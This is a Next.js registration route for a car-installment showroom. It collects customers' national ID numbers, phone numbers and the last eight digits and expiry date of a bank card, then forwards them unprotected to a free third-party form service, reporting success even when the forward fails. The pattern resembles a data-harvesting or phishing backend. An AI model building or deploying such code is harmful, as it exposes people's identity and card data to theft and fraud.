import { NextResponse } from "next/server"
import { cars } from "@/lib/data"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { fullName, nin, cardLast8, cardExpiry, phone1, phone2, hasPreviousInstallment, selectedCarId, createdAt } = body

    // Find the selected car
    const selectedCar = cars.find((car) => car.id === selectedCarId)

    // Format message for Formspree (completely free, no setup needed)
    const message = `
===== تسجيل جديد في Showroom Auto Dzair =====

👤 المعلومات الشخصية:
الاسم الكامل: ${fullName}
رقم التعريف الوطني: ${nin}
رقم الهاتف الأول: ${phone1}
رقم الهاتف الثاني: ${phone2 || "غير محدد"}
هل لديك تقسيط سابق: ${hasPreviousInstallment ? "نعم ✓" : "لا ✗"}

💳 معلومات البطاقة الذهبية:
آخر 8 أرقام: ****${cardLast8}
تاريخ الصلاحية: ${cardExpiry}

🚗 السيارة المختارة:
${selectedCar ? `${selectedCar.brand} ${selectedCar.model} (${selectedCar.year})` : "لم يتم اختيار سيارة"}
${selectedCar ? `السعر: ${new Intl.NumberFormat("ar-DZ").format(selectedCar.price)} دج` : ""}
${selectedCar ? `القسط الشهري: ${new Intl.NumberFormat("ar-DZ").format(selectedCar.monthlyPayment)} دج/شهر` : ""}

📅 تاريخ التسجيل: ${new Date(createdAt).toLocaleString("ar-DZ")}

===== يمكن التواصل مع العميل على: ${phone1} =====
    `

    // Send to Formcarry (free service, no API key needed)
    const formcarryResponse = await fetch("https://formcarry.com/s/ZXsyzAQSlEQ", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json",
      },
      body: JSON.stringify({
        fullName: fullName,
        nin: nin,
        phone1: phone1,
        phone2: phone2 || "غير محدد",
        cardNumber: cardLast8,
        cardExpiry: cardExpiry,
        hasPreviousInstallment: hasPreviousInstallment ? "نعم" : "لا",
        selectedCar: selectedCar ? `${selectedCar.brand} ${selectedCar.model}` : "لم يتم الاختيار",
        carPrice: selectedCar ? `${selectedCar.price} دج` : "",
        monthlyPayment: selectedCar ? `${selectedCar.monthlyPayment} دج/شهر` : "",
        registrationDate: new Date(createdAt).toLocaleString("ar-DZ"),
        _subject: `تسجيل جديد: ${fullName}`,
      }),
    })

    console.log("[v0] Formcarry response status:", formcarryResponse.status)
    const result = await formcarryResponse.json()
    console.log("[v0] Formcarry result:", result)

    if (!formcarryResponse.ok) {
      console.error("[v0] Formcarry error:", result)
    }

    return NextResponse.json({ 
      success: true,
      message: "تم تسجيل بيانات العميل بنجاح وسيتم إرسال الإشعار"
    })
  } catch (error) {
    console.error("[v0] Registration error:", error)
    return NextResponse.json(
      { success: false, message: "حدث خطأ في التسجيل" },
      { status: 500 }
    )
  }
}
